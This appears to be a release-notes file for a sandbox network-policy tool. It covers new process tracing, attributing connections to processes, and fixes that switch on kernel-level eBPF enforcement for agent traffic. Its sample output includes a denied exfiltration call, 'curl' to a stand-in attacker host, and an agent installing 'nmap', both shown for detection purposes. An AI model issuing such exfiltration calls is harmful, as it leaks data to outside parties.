<!--
  MAINTAINER NOTE — update this file BEFORE tagging each release.

  Its contents are injected VERBATIM into every GitHub release's notes,
  between the install header and goreleaser's auto-generated changelog.
  Wiring: .github/workflows/release.yml ("Load release highlights" step) →
  $KM_RELEASE_HIGHLIGHTS → .goreleaser.yaml `release.header` template.

  Keep it to the few MAJOR, human-curated additions for THIS release (the
  auto-changelog already lists every commit). HTML comments like this one
  are hidden in GitHub's rendered view. If this file is empty/absent the
  section is omitted gracefully.
-->
## 🔎 A sandbox can now tell you what it ran, not just where it went

`km-netpolicy execs | who | execs save` adds the process half of last release's egress
census. Every command an agent's tools spawned — `git`, `python`, `curl`, everything they
shelled out to in turn — is now on the record, not just what a human typed at a prompt:

```console
$ km-netpolicy execs --since 10m
14:02:03  uid=1000  pid=4211   ppid=4180   git clone --depth 1 https://github.com/... /workspace/repo
14:03:40  uid=0     pid=4501   ppid=4498   sudo yum install -y nmap
14:05:02  uid=1000  pid=4610   ppid=4180   /usr/bin/nosuchtool --scan  [FAILED ret=2]
```

`who <host>` is the verb that earns its keep — it joins that trace against the flow census
to name the process behind a connection:

```console
$ km-netpolicy who evil.example.com
14:05:02  deny     http     evil.example.com  ← pid=4610 curl -s https://evil.example.com/exfil
```

Live-verified against a real, subprocess-heavy agentic run: 12,973 exec records, real
argv/ppid/uid, and pid attribution that named the actual process behind a flagged connection.

### Attribution comes from the HTTP proxy, and needs `enforcement: ebpf` or `both`

The pid doesn't come from the eBPF ring buffer — almost all agent egress reaches the HTTP
proxy directly (that's what `HTTPS_PROXY` is for), so by the time a connection would reach
the kernel's enforcement path it's already a loopback hop with nothing left to record. The
proxy resolves the pid itself, through two of the eBPF enforcer's own pinned maps, and
stamps it on **every** flow it writes — allow included, not just denies. That only works
once those maps exist, which means this needs `spec.network.enforcement: ebpf` or `both`.
Under plain `proxy` enforcement there's no BPF loaded at all, so there's nothing to resolve
against — `who` says so rather than printing `(none)`.

### ⚠️ A bigger fix rode along: eBPF enforcement had been inert for agent traffic

Getting `who` to work surfaced something worth knowing on its own. cgroup v2 only lets a
process join a cgroup if it can write the *root* of that cgroup, which is owned by root —
so every poller that dispatched an agent turn as the sandbox user via `sudo -u sandbox` had
been silently failing to join the enforcement cgroup since `ebpf`/`both` enforcement shipped.
The eBPF programs that are supposed to block or redirect connections at the kernel level
never actually saw agent-dispatched traffic; a plain interactive `km shell` session was the
only thing that ever really landed inside the cgroup. What was actually enforcing a profile's
allowlist the whole time was the DNS resolver and the HTTP proxy — never the BPF layer.

Fixed across all 15 dispatch sites (Slack, GitHub, HackerOne, Webhook, and the `km agent run`
queue runner). **This switches BPF enforcement on for agent traffic for the first time.** If
a profile's allowlist was subtly looser than intended — loose enough that the DNS resolver
and HTTP proxy never caught it, but that the eBPF allow-trie would have — that gap was
invisible before this release and it is not invisible now. Worth a look at your profiles
before you recreate anything on `ebpf`/`both`.

### 🐛 Every eBPF-sourced flow had a backwards address

Independently found and fixed: every flow record and audit-log entry sourced from the eBPF
ring buffer carried a byte-reversed destination IP, and (for direct-connect events) a
byte-reversed port too — `github.com:443` could show up as `3.114.82.140:47873`. Decoding
the event little-endian and then re-encoding it big-endian reversed the wire bytes twice.
If you've been reading `km-netpolicy observed`/`flows` output, saved a census, or looked at
an `ebpf_network_deny` audit-log entry, treat any `src=ebpf` address/port from before this
release as unreliable — it reads backwards.

### Known, and not hidden

Two things this release doesn't pretend to have solved: running `km-netpolicy execs save`
by hand from an interactive shell currently fails with a missing-environment error (the
automatic save on shutdown still works fine — `sudo systemctl restart km-execlog` is
today's workaround); and a hard power-off still loses whatever hadn't reached disk, same as
it would for any other on-box log.

### ⚠️ Deploy surface — heavier than v0.8.10

This changes rendered user-data and IAM, so it's not a `make build`-only upgrade:

```bash
make build && make build-lambdas && km init --dry-run=false
```

Not `--sidecars` — that rebuilds the sidecar binary but not the create-handler zip that
renders user-data or the IAM policy this needs.

**Existing sandboxes need `km destroy && km create` to gain any of this.** The daemon and
the userdata that wires it up are baked in at boot, not fetched fresh on a running box.

See `docs/exec-capture.md` and `docs/egress-census.md`.
